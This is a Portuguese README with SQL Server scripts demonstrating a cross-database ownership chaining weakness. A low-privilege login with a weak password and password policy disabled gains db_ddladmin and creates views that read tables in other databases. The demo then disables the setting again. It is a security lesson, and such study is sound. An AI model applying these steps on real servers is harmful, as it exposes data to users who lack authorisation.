## Descrição do Script

Este script realiza uma série de operações no banco de dados, incluindo a criação de logins e usuários, a configuração de permissões de acesso e a utilização de cross-database chaining para permitir consultas entre diferentes bancos de dados. Ele é projetado para demonstrar a vulnerabilidade relacionada ao uso de cross-database chaining e a manipulação inadequada de permissões.

### 1. **Criação de Login e Usuário**
   - Cria um login `pedro` com senha 'aaa' e configurações de segurança.
   - Cria um usuário associado ao login em dois bancos de dados: `teste` e `dirceuresende`.

### 2. **Criação de Tabelas**
   - Cria a tabela `Clientes` e a tabela `Alteracao_Objetos` no banco de dados `dirceuresende`.
   - Insere dados nas tabelas criadas.

### 3. **Criação de Views**
   - Cria uma view `vwClientes` no banco de dados `teste` que consulta a tabela `Clientes` no banco de dados `dirceuresende`.
   - Concede permissões de leitura sobre a view para o usuário `pedro`.

### 4. **Execução de Consultas**
   - O script tenta acessar a view `vwClientes` no banco de dados `teste` usando o usuário `pedro`.
   - Habilita o cross-database chaining entre os bancos `teste` e `dirceuresende`, permitindo o acesso aos dados de outro banco de dados.

### 5. **Exploração da Vulnerabilidade de Segurança**
   - Através do cross-database chaining, o script permite que o usuário `pedro`, com permissões específicas, acesse dados de outro banco de dados.
   - Concede ao usuário `pedro` permissões de administrador no banco de dados, incluindo leitura e escrita de dados, e cria views adicionais para acessar dados de outros bancos.
   - O script também explora a brecha de segurança que ocorre quando o owner dos bancos envolvidos é o mesmo.

### 6. **Alterações nas Configurações de Segurança**
   - O script altera a configuração `cross db ownership chaining` na instância para permitir a manipulação entre os bancos.
   - Após realizar testes com os dados acessados através da vulnerabilidade, o script desativa a configuração de `cross db ownership chaining` para restaurar as configurações de segurança padrão.

### 7. **Verificação dos Bancos**
   - O script finaliza verificando os bancos de dados que possuem a propriedade `cross db ownership chaining` ativada.

```SQL
USE [master]
GO

--------------------------------------------------
-- Cria o login e os usuários nos bancos
--------------------------------------------------

IF (EXISTS(SELECT NULL FROM sys.server_principals WHERE [name] = 'pedro')) DROP LOGIN [pedro]
GO

CREATE LOGIN [pedro] WITH PASSWORD='aaa', CHECK_EXPIRATION=OFF, CHECK_POLICY=OFF, DEFAULT_DATABASE=[master]
GO
```

```SQL
USE [teste]
GO

IF (EXISTS(SELECT NULL FROM sys.database_principals WHERE [name] = 'pedro')) DROP USER [pedro]
GO

CREATE USER [pedro] FOR LOGIN [pedro]
GO
```

```SQL
USE [DB]
GO

IF (EXISTS(SELECT NULL FROM sys.database_principals WHERE [name] = 'pedro')) DROP USER [pedro]
GO

CREATE USER [pedro] FOR LOGIN [pedro]
GO


CREATE TABLE dbo.Clientes (
	Id INT IDENTITY(1,1) NOT NULL PRIMARY KEY CLUSTERED,
	Nome VARCHAR(50) NOT NULL
)
GO

INSERT INTO dbo.Clientes VALUES('Indra otsutsuki')
GO


CREATE TABLE dbo.Alteracao_Objetos (
	Id_Alteracao INT IDENTITY(1,1) NOT NULL PRIMARY KEY CLUSTERED,
	Dt_Alteracao DATETIME NOT NULL,
	Ds_Objeto_Alterado VARCHAR(50) NOT NULL
)
GO

INSERT INTO dbo.Alteracao_Objetos (Dt_Alteracao, Ds_Objeto_Alterado)
VALUES('2019-04-10 23:54:33', 'stpTeste1'), ('2019-04-10 23:58:31', 'stpTeste2')
GO


USE [CLR]
GO

IF (EXISTS(SELECT NULL FROM sys.database_principals WHERE [name] = 'pedro')) DROP USER [pedro]
GO

CREATE USER [pedro] FOR LOGIN [pedro]
GO
```

```SQL
--------------------------------------------------
-- Cria a view vwClientes
--------------------------------------------------

USE [teste]
GO

IF (OBJECT_ID('dbo.vwClientes') IS NOT NULL) DROP VIEW dbo.vwClientes
GO 

CREATE VIEW vwClientes
AS
SELECT *
FROM dirceuresende.dbo.Clientes
GO

GRANT SELECT ON vwClientes TO [pedro]
GO
```

```SQL
--------------------------------------------------
-- Tenta acessar a view utilizando o usuário "pedro"
--------------------------------------------------

USE [teste]
GO

SELECT * FROM dbo.vwClientes
```

--------------------------------------------------
-- utilizando cross db chain para acessar a view (logado como um usuário sysadmin agora)
--------------------------------------------------
```SQL
USE [teste]
GO

ALTER DATABASE teste SET DB_CHAINING ON
GO

ALTER DATABASE dirceuresende SET DB_CHAINING ON
GO
```

```SQL
--------------------------------------------------
-- testa o select novamente com o usuário "pedro"
--------------------------------------------------

USE [teste]
GO

SELECT TOP 100 * FROM dbo.vwClientes
GO

SELECT TOP 100 * FROM dirceuresende.dbo.Clientes
GO
```

```SQL
--------------------------------------------------
-- e a brecha de segurança?
-- OBS: essa brecha só funciona quando o owner dos databases envolvidos é o mesmo
--------------------------------------------------

USE [teste]
GO

ALTER ROLE db_ddladmin ADD MEMBER [pedro]
GO

ALTER ROLE db_datareader ADD MEMBER [pedro]
GO

ALTER ROLE db_datawriter ADD MEMBER [pedro]
GO
```

```SQL
--------- conecta com o usuário pedro de novo ------------

USE [teste]
GO

IF (OBJECT_ID('dbo.vwTeste1') IS NOT NULL) DROP VIEW dbo.vwTeste1
GO

CREATE VIEW dbo.vwTeste1
AS
SELECT *
FROM dirceuresende.dbo.Alteracao_Objetos
GO


IF (OBJECT_ID('dbo.vwTeste2') IS NOT NULL) DROP VIEW dbo.vwTeste2
GO

CREATE VIEW dbo.vwTeste2
AS
SELECT *
FROM CLR.dbo.Teste
GO
```

```SQL
--------- conectado com dirceu.resende ------------

USE [teste]
GO

SELECT TOP 100 * FROM vwTeste1
GO

SELECT TOP 100 * FROM vwTeste2
GO
```

```SQL
--------- liberando a nível de instância ------------

USE [master]
GO

ALTER DATABASE [CLR] SET DB_CHAINING ON
GO
```

```SQL
--------- consultando os dados da vwTeste2 -----------

USE [teste]
GO

SELECT TOP 100 * FROM dbo.vwTeste2
GO
```

```SQL
------------ removendo o cross db ownership --------------

USE [CLR]
GO

ALTER DATABASE [CLR] SET DB_CHAINING OFF
GO

ALTER DATABASE dirceuresende SET DB_CHAINING OFF
GO

ALTER DATABASE teste SET DB_CHAINING OFF
GO
```

```SQL
------------ testando os acessos --------------

USE [teste]
GO

SELECT * FROM dbo.vwClientes
GO

SELECT TOP 100 * FROM vwTeste1
GO

SELECT TOP 100 * FROM vwTeste2
GO
```

```SQL
------------ liberando a nível de instância --------------

sp_configure 'show advanced options', 1
GO

RECONFIGURE
GO

sp_configure 'cross db ownership chaining', 1
GO

RECONFIGURE
GO
```

```SQL
--------- conecta com o usuário pedro de novo ------------

USE [teste]
GO

SELECT * FROM dbo.vwClientes
GO

SELECT TOP 100 * FROM vwTeste1
GO

SELECT TOP 100 * FROM vwTeste2
GO
```

```SQL
--------- verifica os bancos que estão com essa propriedade marcada ------------

SELECT [name], is_db_chaining_on 
FROM sys.databases
```